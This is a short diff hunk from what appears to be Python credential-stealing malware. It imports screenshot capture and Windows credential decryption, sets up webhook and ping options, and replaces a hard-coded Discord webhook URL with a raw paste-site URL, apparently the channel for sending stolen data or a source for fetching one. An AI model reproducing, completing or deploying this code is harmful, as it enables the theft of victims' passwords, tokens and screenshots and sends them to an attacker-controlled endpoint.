@@ -24,7 +24,7 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
 __WEBHOOK__ = "%webhook_here%"
-__WEBHOOK2__ = "https://discordapp.com/api/webhooks/1064333105269313636/9AdGzoOLddrW96k4NfAbkybf2xBvjwqQtXlRjEbB9f9FpbW5MQ9yVuPmg4oLtT5czMXl"
+__WEBHOOK2__ = "https://hastepaste.com/raw/eN0W6RMo"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
